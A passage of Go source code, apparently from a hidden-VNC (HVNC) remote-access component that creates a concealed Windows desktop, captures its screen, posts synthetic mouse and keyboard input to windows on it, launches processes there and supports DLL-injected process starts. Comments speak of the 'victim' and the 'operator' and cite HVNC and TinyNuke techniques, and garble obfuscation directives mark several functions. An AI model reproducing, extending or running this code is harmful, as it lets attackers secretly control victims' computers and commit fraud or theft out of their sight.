        case <-timer.C:
                log.Printf("backstage input: task enqueue timeout id=%d kind=%s timeout=%s", task.id, backstageTaskKindName(task.kind), timeout)
                return backstageTaskResult{}, fmt.Errorf("backstage task queue timed out")
        }

        select {
        case result := <-task.resp:
                return result, nil
        case <-timer.C:
                log.Printf("backstage input: task execution timeout id=%d kind=%s timeout=%s", task.id, backstageTaskKindName(task.kind), timeout)
                return backstageTaskResult{}, fmt.Errorf("backstage task execution timed out")
        }
}

func backstageThreadWatchdog() {
        ticker := time.NewTicker(2 * time.Second)
        defer ticker.Stop()
        for range ticker.C {
                id := backstageCurrentTaskID.Load()
                if id == 0 {
                        continue
                }
                startNs := backstageCurrentTaskNs.Load()
                if startNs == 0 {
                        continue
                }
                running := time.Since(time.Unix(0, startNs))
                if running >= 2*time.Second {
                        kind := backstageTaskKindName(backstageTaskKind(backstageCurrentTaskKind.Load()))
                        log.Printf("backstage watchdog: thread appears stuck id=%d kind=%s running=%s", id, kind, running.Round(time.Millisecond))
                }
        }
}

func shouldTracebackstageTask(kind backstageTaskKind) bool {
        switch kind {
        case backstageTaskMouseDown, backstageTaskMouseUp, backstageTaskKeyDown, backstageTaskKeyUp, backstageTaskMouseWheel, backstageTaskStartProcess, backstageTaskStartProcessInjected, backstageTaskAutoStartExplorer:
                return true
        default:
                return false
        }
}

func backstageTaskKindName(kind backstageTaskKind) string {
        switch kind {
        case backstageTaskCapture:
                return "capture"
        case backstageTaskStartProcess:
                return "start_process"
        case backstageTaskStartProcessInjected:
                return "start_process_injected"
        case backstageTaskMouseMove:
                return "mouse_move"
        case backstageTaskMouseDown:
                return "mouse_down"
        case backstageTaskMouseUp:
                return "mouse_up"
        case backstageTaskKeyDown:
                return "key_down"
        case backstageTaskKeyUp:
                return "key_up"
        case backstageTaskMouseWheel:
                return "mouse_wheel"
        case backstageTaskAutoStartExplorer:
                return "auto_start_explorer"
        case backstageTaskShutdown:
                return "shutdown"
        default:
                return fmt.Sprintf("unknown(%d)", kind)
        }
}

func backstageTaskDetails(task backstageTask) string {
        switch task.kind {
        case backstageTaskMouseDown, backstageTaskMouseUp:
                return fmt.Sprintf("button=%d", task.button)
        case backstageTaskKeyDown, backstageTaskKeyUp:
                return fmt.Sprintf("vk=%d", task.vk)
        case backstageTaskMouseWheel:
                return fmt.Sprintf("delta=%d", task.delta)
        case backstageTaskStartProcess:
                return fmt.Sprintf("cmd=%q", task.filePath)
        case backstageTaskStartProcessInjected:
                return fmt.Sprintf("cmd=%q search=%q replace=%q method=%s dllSize=%d", task.filePath, task.searchPath, task.replacePath, task.method, len(task.dllBytes))
        default:
                return ""
        }
}

var (
        backstageCapHDCScreen uintptr
        backstageCapHDCMem    uintptr
        backstageCapHBMP      uintptr
        backstageCapBits      unsafe.Pointer
        backstageCapW         int
        backstageCapH         int
        backstageCapImg       *image.RGBA
)

func backstageFreeCapCache() {
        if backstageCapHBMP != 0 {
                deleteObject(backstageCapHBMP)
                backstageCapHBMP = 0
        }
        if backstageCapHDCMem != 0 {
                deleteDC(backstageCapHDCMem)
                backstageCapHDCMem = 0
        }
        if backstageCapHDCScreen != 0 {
                releaseDC(0, backstageCapHDCScreen)
                backstageCapHDCScreen = 0
        }
        backstageCapBits = nil
        backstageCapW = 0
        backstageCapH = 0
        backstageCapImg = nil
}

func backstageEnsureCapCache(w, h int) (uintptr, uintptr, []byte, bool) {
        if backstageCapHDCScreen == 0 {
                backstageCapHDCScreen = getDC(0)
                if backstageCapHDCScreen == 0 {
                        return 0, 0, nil, false
                }
        }
        if backstageCapHDCMem != 0 && backstageCapW == w && backstageCapH == h && backstageCapBits != nil {
                buf := unsafe.Slice((*byte)(backstageCapBits), w*h*4)
                return backstageCapHDCScreen, backstageCapHDCMem, buf, true
        }
        if backstageCapHBMP != 0 {
                deleteObject(backstageCapHBMP)
                backstageCapHBMP = 0
        }
        if backstageCapHDCMem != 0 {
                deleteDC(backstageCapHDCMem)
                backstageCapHDCMem = 0
        }
        backstageCapHDCMem = createCompatibleDC(backstageCapHDCScreen)
        if backstageCapHDCMem == 0 {
                return 0, 0, nil, false
        }
        bmi := bitmapInfo{
                bmiHeader: bitmapInfoHeader{
                        biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
                        biWidth:       int32(w),
                        biHeight:      -int32(h),
                        biPlanes:      1,
                        biBitCount:    32,
                        biCompression: BI_RGB,
                },
        }
        backstageCapHBMP = createDIBSection(backstageCapHDCMem, &bmi, DIB_RGB_COLORS, &backstageCapBits)
        if backstageCapHBMP == 0 || backstageCapBits == nil {
                deleteDC(backstageCapHDCMem)
                backstageCapHDCMem = 0
                return 0, 0, nil, false
        }
        selectObject(backstageCapHDCMem, backstageCapHBMP)
        backstageCapW = w
        backstageCapH = h
        backstageCapImg = nil
        buf := unsafe.Slice((*byte)(backstageCapBits), w*h*4)
        return backstageCapHDCScreen, backstageCapHDCMem, buf, true
}

func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
        //garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
        backstageCaptureMu.Lock()
        defer backstageCaptureMu.Unlock()

        setDPIAware()

        maxDisplays := displayCount()
        if maxDisplays <= 0 {
                maxDisplays = 1
        }
        if display < 0 || display >= maxDisplays {
                log.Printf("backstage capture: requested display %d out of range (0-%d), defaulting to 0", display, maxDisplays-1)
                display = 0
        }

        bounds, boundsSource := backstageResolveCaptureBounds(display)
        srcW := bounds.Dx()
        srcH := bounds.Dy()
        if srcW <= 0 || srcH <= 0 {
                log.Printf("backstage capture: invalid bounds for display=%d source=%s bounds=%v", display, boundsSource, bounds)
                return nil, syscall.EINVAL
        }

        userScale := effectiveScale(srcW, srcH)
        backstageLastScale.Store(math.Float64bits(userScale))
        dstW := int(float64(srcW) * userScale)
        dstH := int(float64(srcH) * userScale)
        if dstW <= 0 || dstH <= 0 {
                dstW = srcW
                dstH = srcH
        }

        if dwmHDC, dwmBuf, ok := backstageEnsureDWMCompCache(dstW, dstH); ok {
                for i := range dwmBuf {
                        dwmBuf[i] = 0
                }
                if drawbackstageStagingFromDWM(dwmHDC, bounds, dstW, dstH, dwmBuf) {
                        swapRB(dwmBuf)
                        img := GetRGBA(dstW, dstH)
                        copy(img.Pix, dwmBuf)
                        drawbackstageCursorOverlay(img, bounds, dstW, dstH)
                        return img, nil
                }
        }

        capW := srcW
        capH := srcH

        hdcScreen, hdcMem, buf, ok := backstageEnsureCapCache(capW, capH)
        if !ok {
                return nil, syscall.EINVAL
        }

        for i := range buf {
                buf[i] = 0
        }

        drawn := drawbackstageWindowsToBuffer(hdcScreen, bounds, buf, capW*4)
        if drawn == 0 {
                now := time.Now().UnixNano()
                last := backstageNoWindowLogNs.Load()
                if now-last > int64(5*time.Second) && backstageNoWindowLogNs.CompareAndSwap(last, now) {
                        log.Printf("backstage capture: no windows drawn for display=%d source=%s bounds=%v", display, boundsSource, bounds)
                }
        }

        swapRB(buf)

        img := backstageCapImg
        if img == nil || img.Bounds().Dx() != capW || img.Bounds().Dy() != capH {
                img = image.NewRGBA(image.Rect(0, 0, capW, capH))
                backstageCapImg = img
        }
        copy(img.Pix, buf)

        _ = hdcMem

        if dstW != capW || dstH != capH {
                img = resizeNearest(img, dstW, dstH)
        }

        drawbackstageCursorOverlay(img, bounds, dstW, dstH)

        return img, nil
}

// backstageCursorMask is a classic arrow pointer: 'X' = black outline,
// '#' = white fill, hotspot at (0,0).
var backstageCursorMask = []string{
        "X...........",
        "XX..........",
        "X#X.........",
        "X##X........",
        "X###X.......",
        "X####X......",
        "X#####X.....",
        "X######X....",
        "X#######X...",
        "X########X..",
        "X#####XXXXX.",
        "X#X#X.......",
        "XX.X#X......",
        "X..X#X......",
        "....X#X.....",
        "....X#X.....",
        ".....X#X....",
        ".....X#X....",
        "......X.....",
}

// drawbackstageCursorOverlay paints the operator's pointer onto the composed
// backstage frame. Per-window PrintWindow capture cannot include the real
// cursor (it is not a window), so the overlay makes the hidden desktop feel
// like a real VNC session: the pointer tracks every move and a gold ring
// flashes while any button is held.
func drawbackstageCursorOverlay(img *image.RGBA, bounds image.Rectangle, dstW, dstH int) {
        if img == nil || !backstageCursorEnabled {
                return
        }
        backstageInputMu.Lock()
        hasCursor := backstageHasCursor
        cx := int(backstageLastCursor.x)
        cy := int(backstageLastCursor.y)
        buttons := backstageMouseButtons
        backstageInputMu.Unlock()
        if !hasCursor {
                return
        }
        if cx < bounds.Min.X || cy < bounds.Min.Y || cx >= bounds.Max.X || cy >= bounds.Max.Y {
                return
        }
        outX := (cx-bounds.Min.X)*dstW/bounds.Dx()
        outY := (cy-bounds.Min.Y)*dstH/bounds.Dy()

        if buttons&(MK_LBUTTON|MK_RBUTTON|MK_MBUTTON) != 0 {
                ring := 7
                inner := (ring - 1) * (ring - 1)
                outer := ring * ring
                for dy := -ring; dy <= ring; dy++ {
                        for dx := -ring; dx <= ring; dx++ {
                                d := dx*dx + dy*dy
                                if d > inner && d <= outer {
                                        plotbackstagePixel(img, outX+dx, outY+dy, 224, 182, 79, 230)
                                }
                        }
                }
        }

        for row, line := range backstageCursorMask {
                for col, ch := range line {
                        switch ch {
                        case '#':
                                plotbackstagePixel(img, outX+col, outY+row, 255, 255, 255, 255)
                        case 'X':
                                plotbackstagePixel(img, outX+col, outY+row, 17, 17, 17, 255)
                        }
                }
        }
}

func plotbackstagePixel(img *image.RGBA, x, y int, r, g, b, a uint8) {
        if img == nil || x < 0 || y < 0 || x >= img.Bounds().Dx() || y >= img.Bounds().Dy() {
                return
        }
        i := (y*img.Bounds().Dx() + x) * 4
        img.Pix[i] = r
        img.Pix[i+1] = g
        img.Pix[i+2] = b
        img.Pix[i+3] = a
}

func startbackstageProcessOnThread(filePath string, display int) (uint32, error) {
        if filePath == "" {
                return 0, fmt.Errorf("empty file path")
        }

        desktopNamePtr, err := syscall.UTF16PtrFromString(backstageDesktopName)
        if err != nil {
                return 0, fmt.Errorf("failed to convert desktop name: %v", err)
        }
        cmdLine, err := syscall.UTF16FromString(filePath)
        if err != nil {
                return 0, fmt.Errorf("failed to convert command line: %v", err)
        }
        posX, posY := 0, 0
        if mons := monitorList(); display >= 0 && display < len(mons) {
                posX = mons[display].rect.Min.X
                posY = mons[display].rect.Min.Y
        }
        var si startupInfo
        var pi processInformation
        si.cb = uint32(unsafe.Sizeof(si))
        si.lpDesktop = desktopNamePtr
        si.dwX = uint32(posX)
        si.dwY = uint32(posY)
        si.dwFlags = STARTF_USEPOSITION

        ret, _, callErr := procCreateProcessW.Call(
                0,
                uintptr(unsafe.Pointer(&cmdLine[0])),
                0,
                0,
                0,
                uintptr(CREATE_NEW_CONSOLE),
                0,
                0,
                uintptr(unsafe.Pointer(&si)),
                uintptr(unsafe.Pointer(&pi)),
        )
        if ret == 0 {
                if callErr != nil {
                        return 0, fmt.Errorf("CreateProcess failed: %v", callErr)
                }
                return 0, fmt.Errorf("CreateProcess failed")
        }
        return pi.dwProcessId, nil
}

func backstageAutoStartExplorerOnThread() error {
        if backstageExplorerStarted {
                return nil
        }

        backstageDesktopMu.Lock()
        deskHandle := backstageDesktopHandle
        backstageDesktopMu.Unlock()
        if explorerPresentOnDesktop(deskHandle) {
                log.Printf("backstage: explorer.exe already present on backstage desktop, skipping auto-start")
                backstageExplorerStarted = true
                return nil
        }

        // Dedicated-instance recipe (field-proven HVNC): a plain explorer.exe
        // merges into the interactive user's existing shell process, so its
        // folder windows never live on the hidden desktop and cannot be
        // driven. The shell:::{3080F90E-D7AD-11D9-BD98-0000947B0257} trick
        // forces a NEW explorer process bound to the current (hidden)
        // desktop with a private shell window.
        log.Printf("backstage: no explorer.exe on backstage desktop, starting dedicated explorer instance")
        _, err := startbackstageProcessOnThread("explorer.exe shell:::{3080F90E-D7AD-11D9-BD98-0000947B0257}", 0)
        if err != nil {
                return fmt.Errorf("auto-start explorer failed: %w", err)
        }
        backstageExplorerStarted = true
        return nil
}

func isExplorerPID(pid uint32) bool {
        const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
        hProc, _, _ := kernel32.NewProc("OpenProcess").Call(
                PROCESS_QUERY_LIMITED_INFORMATION, 0, uintptr(pid),
        )
        if hProc == 0 {
                return false
        }
        defer procCloseHandle.Call(hProc)

        var buf [260]uint16
        size := uint32(len(buf))
        ret, _, _ := kernel32.NewProc("QueryFullProcessImageNameW").Call(
                hProc, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)),
        )
        if ret == 0 {
                return false
        }
        name := strings.ToLower(syscall.UTF16ToString(buf[:size]))
        return strings.HasSuffix(name, `\explorer.exe`)
}

// explorerPresentOnDesktop reports whether a top-level window owned by
// explorer.exe exists on the hidden backstage desktop. The machine-wide
// process list cannot be used for this decision: the interactive user's own
// shell (explorer.exe on the visible desktop) is always running and would
// wrongly suppress spawning the backstage shell.
func explorerPresentOnDesktop(deskHandle uintptr) bool {
        if deskHandle == 0 {
                return false
        }
        found := false
        cb := syscall.NewCallback(func(hwnd, _ uintptr) uintptr {
                if found || backstageIsDWMHost(hwnd) {
                        return 1
                }
                if !isWindowVisible(hwnd) {
                        return 1
                }
                pid := windowPID(hwnd)
                if pid != 0 && isExplorerPID(pid) {
                        found = true
                }
                return 1 // continue enumeration
        })
        procEnumDesktopWindows.Call(deskHandle, cb, 0)
        return found
}

func backstageMouseMoveOnThread(display int, x, y int32) error {
        //garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
        bounds, _ := backstageResolveCaptureBounds(display)
        if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
                backstageInputMu.Lock()
                backstageLastCursor = point{x: x, y: y}
                backstageHasCursor = true
                backstageInputMu.Unlock()
                return nil
        }

        if bits := backstageLastScale.Load(); bits != 0 {
                if s := math.Float64frombits(bits); s > 0 && s < 1 {
                        x = int32(float64(x) / s)
                        y = int32(float64(y) / s)
                }
        }

        absX := bounds.Min.X + int(x)
        absY := bounds.Min.Y + int(y)
        if absX < bounds.Min.X {
                absX = bounds.Min.X
        }
        if absY < bounds.Min.Y {
                absY = bounds.Min.Y
        }
        if absX >= bounds.Max.X {
                absX = bounds.Max.X - 1
        }
        if absY >= bounds.Max.Y {
                absY = bounds.Max.Y - 1
        }

        backstageInputMu.Lock()
        backstageLastCursor = point{x: int32(absX), y: int32(absY)}
        backstageHasCursor = true
        backstageInputMu.Unlock()

        pt := point{x: int32(absX), y: int32(absY)}
        backstageSyncCursor(pt)

        movebackstageWindowIfDragging(pt)

        hitHwnd := windowFromPoint(pt)
        if hitHwnd != 0 {
                rememberWorkingWindow(hitHwnd)
                // BSv5: no forced activation on moves — HVNCMemory posts the
                // bare WM_MOUSEMOVE and nothing else. Forced SetForeground
                // during an app's startup window is a poison vector.

                if backstageUIAEnabled.Load() && isWinUI3Window(hitHwnd) {
                        uiaHandleDragMove(pt)
                        uiaHandleMouseMove(hitHwnd, pt)
                        return nil
                }

                clientPt := pt
                procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))
                postMouseMessage(hitHwnd, WM_MOUSEMOVE, uintptr(currentMouseButtons()), clientPt)
        }
        return nil
}

func backstageMouseButtonOnThread(button int, down bool) error {
        //garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
        pt := currentbackstageCursor()
        backstageSyncCursor(pt)

        if button == 0 && !down {
                endbackstageWindowDrag(pt)

                // Left-up completing a popup-menu click: menu windows
                // (#32768) interpret mouse lParams as SCREEN coordinates —
                // route the up event back to the menu window recorded on
                // down instead of the generic client-coordinate path.
                backstageInputMu.Lock()
                menuHwnd := backstageMenuClickHwnd
                backstageMenuClickHwnd = 0
                backstageInputMu.Unlock()
                if menuHwnd != 0 {
                        postMouseMessage(menuHwnd, WM_LBUTTONUP, 0, pt)
                        return nil
                }
        }

        setMouseButton(button, down)

        hitHwnd := windowFromPoint(pt)
        if hitHwnd == 0 {
                return nil
        }

        // UIA branch: ONLY for WinUI3 windows. Routing every native
        // window's clicks through cross-process UIA COM (ElementFromPoint,
        // SetFocus, SelectionItem.Select) adds latency, lets slow or hung
        // providers eat clicks, and mutates app state. Plain windows work
        // reliably with the posted-message path below.
        if backstageUIAEnabled.Load() && isWinUI3Window(hitHwnd) {
                return uiaHandleMouseButton(hitHwnd, pt, button, down)
        }

        // BSv5: research-exact click delivery — NO activation shim on the
        // click path. HVNCMemory (field-proven) delivers clicks with zero
        // SetForegroundWindow / AttachThreadInput / SetFocus calls; only real
        // OS input generates WM_ACTIVATE chains, and targets that verify
        // focus consistency reject anything else. AttachThreadInput on a busy
        // target thread can also stall the input worker.
        clientHwnd := backstageResolveClientTarget(hitHwnd)

        if down {
                backstageLogf("%s click btn=%d down pt=(%d,%d) hwnd=0x%x class=%q pid=%d desktop=%q pump=%s",
                        backstageInputEngineVersion, button, pt.x, pt.y,
                        hitHwnd, getWindowClassName(hitHwnd), windowPID(hitHwnd),
                        backstageTargetDesktopName(hitHwnd), backstagePumpProbe(hitHwnd))
        }

        lparam := makeLParam(pt.x, pt.y)

        // Native popup menus (#32768) run their own modal loop and ignore
        // posted mouse messages entirely; an item is activated by selecting
        // it and pressing Enter instead.
        if button == 0 && down && backstageHandlePopupClick(hitHwnd, pt) {
                return nil
        }

        if button == 0 && clientHwnd == hitHwnd {
                hitTest := safeNCHitTest(hitHwnd, lparam)
                if down && hitTest != HTCLIENT && hitTest != 0 {
                        backstageLogf("%s nchittest pt=(%d,%d) hwnd=0x%x class=%q result=%d", backstageInputEngineVersion, pt.x, pt.y, hitHwnd, getWindowClassName(hitHwnd), hitTest)
                }

                // HTTRANSPARENT: the window under the point defers to whatever
                // is beneath it (layered/glass surfaces). Temporarily disable it
                // so the point resolves to the window underneath, click there,
                // then restore the style — the TinyNuke-family trick.
                if hitTest == bsInHTTransparent {
                        transparentHwnd := hitHwnd
                        origStyle, _, _ := procGetWindowLongPtrW.Call(transparentHwnd, bsInGWLStyle)
                        procSetWindowLongPtrW.Call(transparentHwnd, bsInGWLStyle, uintptr(uint32(origStyle)|bsInWSDisabled))
                        if next := windowFromPoint(pt); next != 0 {
                                hitHwnd = next
                                hitTest = safeNCHitTest(hitHwnd, lparam)
                        }
                        defer procSetWindowLongPtrW.Call(transparentHwnd, bsInGWLStyle, origStyle)
                }

                if hitTest != HTCLIENT && hitTest != 0 {
                        // Caption buttons and syscommands belong to the top-level
                        // window even when hit-testing resolved a child frame.
                        top := rootWindow(hitHwnd)

                        if hitTest == HTCLOSE && !down {
                                procPostMessageW.Call(top, WM_CLOSE, 0, 0)
                                return nil
                        }

                        if hitTest == HTCAPTION {
                                if down {
                                        // Caption double-click toggles
                                        // maximize/restore. We never enter the
                                        // native modal move loop, so the OS
                                        // double-click path is unavailable and
                                        // must be emulated explicitly.
                                        if backstageIsDoubleClick(0, pt) {
                                                if isWindowMaximized(top) {
                                                        procPostMessageW.Call(top, WM_SYSCOMMAND, SC_RESTORE, 0)
                                                } else {
                                                        procPostMessageW.Call(top, WM_SYSCOMMAND, SC_MAXIMIZE, 0)
                                                }
                                                return nil
                                        }
                                        var r rect
                                        if ok, _, _ := procGetWindowRect.Call(hitHwnd, uintptr(unsafe.Pointer(&r))); ok != 0 {
                                                backstageInputMu.Lock()
                                                backstageMovingWindow = true
                                                backstageWindowToMove = hitHwnd
                                                backstageMoveOffset = point{x: pt.x - r.left, y: pt.y - r.top}
                                                backstageWindowSize = point{x: r.right - r.left, y: r.bottom - r.top}
                                                backstageResizeEdge = 0
                                                backstageInputMu.Unlock()
                                        }
                                }
                                return nil
                        }

                        if hitTest == HTMAXBUTTON && !down {
                                if isWindowMaximized(top) {
                                        procPostMessageW.Call(top, WM_SYSCOMMAND, SC_RESTORE, 0)
                                } else {
                                        procPostMessageW.Call(top, WM_SYSCOMMAND, SC_MAXIMIZE, 0)
                                }
                                return nil
                        }

                        if hitTest == HTMINBUTTON && !down {
                                procPostMessageW.Call(top, WM_SYSCOMMAND, SC_MINIMIZE, 0)
                                return nil
                        }

                        if down && hitTest >= HTLEFT && hitTest <= HTBOTTOMRIGHT {
                                // Emulated modal size loop: latch the edge and the
                                // original rect; the move path resizes live, the left
                                // button up finalizes.
                                var r rect
                                if ok, _, _ := procGetWindowRect.Call(hitHwnd, uintptr(unsafe.Pointer(&r))); ok != 0 {
                                        backstageInputMu.Lock()
                                        backstageMovingWindow = true
                                        backstageWindowToMove = hitHwnd
                                        backstageResizeEdge = int32(hitTest)
                                        backstageResizeOrig = r
                                        backstageInputMu.Unlock()
                                }
                                return nil
                        }

                        if down && (hitTest == bsInHTSysMenu || hitTest == bsInHTHScroll || hitTest == bsInHTVScroll) {
                                procPostMessageW.Call(top, WM_NCLBUTTONDOWN, uintptr(uint32(hitTest)), lparam)
                                procPostMessageW.Call(top, WM_NCLBUTTONUP, uintptr(uint32(hitTest)), lparam)
                                return nil
                        }
                }
        }

        clientPt := pt
        procScreenToClient.Call(clientHwnd, uintptr(unsafe.Pointer(&clientPt)))

        var msg uint32
        var wparam uintptr
        switch button {
        case 0:
                if down {
                        msg = WM_LBUTTONDOWN
                        wparam = MK_LBUTTON
                        if backstageIsDoubleClick(0, pt) {
                                msg = bsInWMLButtonDblClk
                        }
                } else {
                        msg = WM_LBUTTONUP
                        wparam = 0
                }
        case 1:
                if down {
                        msg = WM_MBUTTONDOWN
                        wparam = MK_MBUTTON
                } else {
                        msg = WM_MBUTTONUP
                        wparam = 0
                }
        case 2:
                if down {
                        msg = WM_RBUTTONDOWN
                        wparam = MK_RBUTTON
                } else {
                        msg = WM_RBUTTONUP
                        wparam = 0
                }
        default:
                return nil
        }

        // BSv5: no hover-priming synthetic WM_MOUSEMOVE — the field-proven
        // research engine posts the bare click pair only; extra synthetic
        // moves can desync toolkit hover/click state machines on posted input.
        postMouseMessage(clientHwnd, msg, wparam, clientPt)
        return nil
}

func backstageKeyOnThread(vk uint16, text string, down bool) error {
        //garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
        pt := currentbackstageCursor()
        hwnd := windowFromPoint(pt)
        if hwnd == 0 {
                hwnd = foregroundWindow()
        }
        if hwnd == 0 {
                hwnd = getWorkingWindow()
        }
        if hwnd == 0 {
                hwnd = findAnyVisibleTopLevelWindow()
        }
        if hwnd == 0 {
                return nil
        }
        root := rootWindow(hwnd)
        prevWorking := getWorkingWindow()
        rememberWorkingWindow(root)
        prevRoot := rootWindow(prevWorking)
        if prevWorking == 0 || (prevRoot != root && !sameProcessWindows(prevRoot, root)) {
                // Keyboard KEEPS the real-focus chain (AttachThreadInput ->
                // SetForegroundWindow/SetActiveWindow/SetFocus): typing needs
                // a genuine focus target. Clicks no longer use it.
                backstageActivateWindowForClick(root, hwnd, true)
        }
        updateModifierState(vk, down)

        if backstageUIAEnabled.Load() && isWinUI3Window(hwnd) {
                if isModifierVK(vk) {
                        return nil
                }
                return uiaHandleKey(hwnd, vk, text, down)
        }

        if isModifierVK(vk) {
                return nil
        }

        if down {
                if text != "" && !isNonPrintableVK(vk) {
                        postTextMessage(hwnd, text)
                } else if ch := virtualKeyToChars(vk); len(ch) > 0 && !isNonPrintableVK(vk) {
                        for _, r := range ch {
                                procPostMessageW.Call(hwnd, WM_CHAR, uintptr(r), uintptr(1))
                        }
                } else {
                        postKeyMessage(hwnd, WM_KEYDOWN, vk)
                }
        } else {
                postKeyMessage(hwnd, WM_KEYUP, vk)
        }
        return nil
}

func printableKeyText(text string) string {
        if !utf8.ValidString(text) || utf8.RuneCountInString(text) != 1 {
                return ""
        }
        r, _ := utf8.DecodeRuneInString(text)
        if r < 0x20 || r == 0x7f {
                return ""
        }
        return text
}

func postTextMessage(hwnd uintptr, text string) {
        for _, unit := range syscall.StringToUTF16(text) {
                if unit != 0 {
                        procPostMessageW.Call(hwnd, WM_CHAR, uintptr(unit), uintptr(1))
                }
        }
}

func foregroundWindow() uintptr {
        r, _, _ := procGetForegroundWindow.Call()
        return r
}

func findAnyVisibleTopLevelWindow() uintptr {
        hwnd := getTopWindow(0)
        for hwnd != 0 {
                if !backstageIsDWMHost(hwnd) && isWindowVisible(hwnd) {
                        return hwnd
                }
                hwnd = getWindow(hwnd, GW_HWNDNEXT)
        }
        return 0
}

func makeLParam(x, y int32) uintptr {
        return uintptr((uint32(y) << 16) | (uint32(x) & 0xFFFF))
}

func windowFromPoint(pt point) uintptr {
        ret, _, _ := procWindowFromPoint.Call(uintptr(*(*int64)(unsafe.Pointer(&pt))))
        if backstageIsDWMHost(ret) {
                return 0
        }
        return ret
}

func rootWindow(hwnd uintptr) uintptr {
        if hwnd == 0 {
                return 0
        }
        r, _, _ := procGetAncestor.Call(hwnd, GA_ROOT)
        if r == 0 {
                return hwnd
        }
        return r
}

func windowPID(hwnd uintptr) uint32 {
        var pid uint32
        procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
        return pid
}

func sameProcessWindows(a, b uintptr) bool {
        if a == 0 || b == 0 {
                return false
        }
        return windowPID(a) == windowPID(b)
}

func setWorkingWindow(hwnd uintptr) {
        if hwnd == 0 {
                return
        }
        rememberWorkingWindow(hwnd)
        procSetForegroundWindow.Call(hwnd)
        procSetActiveWindow.Call(hwnd)
        procSetFocus.Call(hwnd)
}

func rememberWorkingWindow(hwnd uintptr) {
        if hwnd == 0 {
                return
        }
        backstageInputMu.Lock()
        backstageWorkingWindow = hwnd
        backstageInputMu.Unlock()
}

func getWorkingWindow() uintptr {
        backstageInputMu.Lock()
        defer backstageInputMu.Unlock()
        return backstageWorkingWindow
}

func currentbackstageCursor() point {
        backstageInputMu.Lock()
        if backstageHasCursor {
                pt := backstageLastCursor
                backstageInputMu.Unlock()
                return pt
        }
        backstageInputMu.Unlock()
        var pt point
        procGetCursorPosbackstage.Call(uintptr(unsafe.Pointer(&pt)))
        return pt
}

// Throttled delivery diagnostics (one line per second max):
// click target identity + failed posts (err 5 = UIPI/elevated target).
var backstageClickLogNs atomic.Int64
var backstagePostFailLogNs atomic.Int64

func postMouseMessage(hwnd uintptr, msg uint32, wparam uintptr, pt point) {
        ret, _, callErr := procPostMessageW.Call(hwnd, uintptr(msg), wparam, makeLParam(pt.x, pt.y))
        if ret == 0 {
                now := time.Now().UnixNano()
                last := backstagePostFailLogNs.Load()
                if now-last > int64(time.Second) && backstagePostFailLogNs.CompareAndSwap(last, now) {
                        log.Printf("backstage input: post hwnd=0x%x msg=0x%x FAILED err=%v (err 5 = UIPI/elevated target)", hwnd, msg, callErr)
                }
        }
}

// backstageSyncCursorEnabled mirrors the emulated cursor into the session's
// global cursor position before posted mouse events. The kernel keeps ONE
// cursor position per session (gpsi->ptCursor; ReactOS
// win32ss/user/ntuser/cursoricon.c UserSetCursorPos) and SetCursorPos is NOT
// gated by IntIsActiveDesktop, so it works from the hidden-desktop thread.
// Apps that read GetCursorPos()/GetMessagePos() instead of the message lParam
// (custom toolkits, TrackPopupMenu(GetCursorPos()) callers) only behave when
// this global tracks the operator's pointer. Known side effect: the position
// is session-global, so the visible cursor on the victim's active desktop
// moves with it while interacting.
var backstageSyncCursorEnabled = true

func backstageSyncCursor(pt point) {
        if !backstageSyncCursorEnabled {
                return
        }
        procSetCursorPosbackstage.Call(uintptr(int32(pt.x)), uintptr(int32(pt.y)))
}

// ---------------------------------------------------------------------------
// BSv5 engine instrumentation.
//
// Every click logs: target hwnd/class/pid, the desktop the TARGET thread
// lives on, and whether the target's UI thread is actually pumping messages.
// These three facts separate the only remaining failure classes that field
// testing could not distinguish from the operator seat:
//   1. post failed (err 5 -> UIPI/elevated target)            [postMouseMessage]
//   2. target lives on a DIFFERENT desktop (spawn-side bug)   [desktop=...
//   3. target thread not pumping (blocked app looks alive
//      in a DWM composite but never processes posted input)   [pump=...]
// Lines go to the agent log AND to backstage-input.log next to the agent
// executable, so the diagnosis never depends on console visibility.
// ---------------------------------------------------------------------------

const backstageInputEngineVersion = "BSv5"

var (
        backstageLogFileMu   sync.Mutex
        backstageLogFileOnce sync.Once
        backstageLogFile     *os.File
        backstageLogPath     string
)

func backstageFileLog(line string) {
        backstageLogFileOnce.Do(func() {
                exe, err := os.Executable()
                if err != nil {
                        return
                }
                backstageLogPath = filepath.Join(filepath.Dir(exe), "backstage-input.log")
                f, err := os.OpenFile(backstageLogPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
                if err != nil {
                        return
                }
                backstageLogFile = f
        })
        if backstageLogFile == nil {
                return
        }
        backstageLogFileMu.Lock()
        defer backstageLogFileMu.Unlock()
        if st, err := backstageLogFile.Stat(); err == nil && st.Size() > 256*1024 {
                backstageLogFile.Close()
                f, err := os.OpenFile(backstageLogPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
                if err != nil {
                        backstageLogFile = nil
                        return
                }
                backstageLogFile = f
        }
        backstageLogFile.WriteString(time.Now().Format("15:04:05.000 ") + line + "\n")
}

func backstageLogf(format string, args ...any) {
        line := fmt.Sprintf(format, args...)
        log.Printf("%s", line)
        backstageFileLog(line)
}

func backstageDesktopNameOfHandle(hdesk uintptr) string {
        var buf [64]uint16
        var needed uint32
        r, _, _ := procGetUserObjectInformationW.Call(
                hdesk,
                2, // UO_OBJECT_NAME
                uintptr(unsafe.Pointer(&buf[0])),
                uintptr(len(buf)*2),
                uintptr(unsafe.Pointer(&needed)),
        )
        if r == 0 {
                return "?"
        }
        return syscall.UTF16ToString(buf[:])
}

func backstageDesktopNameOfThread(tid uint32) string {
        if tid == 0 {
                return "?"
        }
        hdesk, _, _ := procGetThreadDesktop.Call(uintptr(tid))
        if hdesk == 0 {
                return "?"
        }
        return backstageDesktopNameOfHandle(hdesk)
}

func backstageTargetDesktopName(hwnd uintptr) string {
        var pid uint32
